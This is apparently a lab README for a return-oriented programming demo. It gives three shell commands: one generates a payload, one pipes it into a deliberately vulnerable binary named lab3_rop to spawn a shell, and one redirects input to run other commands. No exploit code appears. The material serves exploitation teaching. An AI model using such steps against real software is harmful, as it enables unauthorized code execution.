# ROP Demo : Spawning a Shell
---

__Step 1:__ Constructing payload
```
$ python shell_rop_generator.py
```
__Step 2:__ Executing ROP exploit
```
$ (cat payload.exp ; cat) | ./lab3_rop
```
__Step 3:__ For executing any other command like "/bin/date" or "/bin/ls", change the exploit script and pass input to executable in the following way
```
$ ./lab3_rop < payload.exp
```